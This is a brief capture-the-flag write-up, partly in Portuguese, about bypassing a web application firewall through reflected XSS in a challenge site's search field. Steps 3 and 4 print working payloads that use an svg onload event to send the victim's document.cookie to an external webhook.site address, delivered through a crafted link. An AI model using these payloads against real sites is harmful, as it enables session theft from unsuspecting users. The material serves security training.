# Challenge `Give_me_more_than_a_simple_WAF` writeup

- Vulnerability: What type of vulnerability is being exploited
  - XSS - Cross Site Scripting (Reflected)
- Where: Where is the vulnerability present
  - Campo search
- Impact: What results of exploiting this vulnerability
  - WAF bypass

## Steps to reproduce

1. Comecei por testar o que ocorria quando executava um script simples, como `<script>alert(1)</script>` no campo search, no entanto apareceu uma mensagem de erro
2. Utilizei o zaproxy de forma a identificar um possível payload onde ele recomendou este ataque `" onMouseOver="alert(1);`
3. Do ponto 2 percebi que com um envento javascript seria possível escrever um "script", então após pesquisar como fazer WAF bypass surgi com este payload `<svg/onrandom=random onload=document.location="https://webhook.site/961991c1-1ddd-4e42-b026-09d320cd060d?cookie="+document.cookie>`, executado no campo search
4. O payload final executado no campo `'Link of the bug/feature request you want to report on.'` foi `http://mustard.stt.rnl.tecnico.ulisboa.pt:22252/?search=<svg/onload=document.location="https://webhook.site/961991c1-1ddd-4e42-b026-09d320cd060d?cookie="%2bdocument.cookie>`
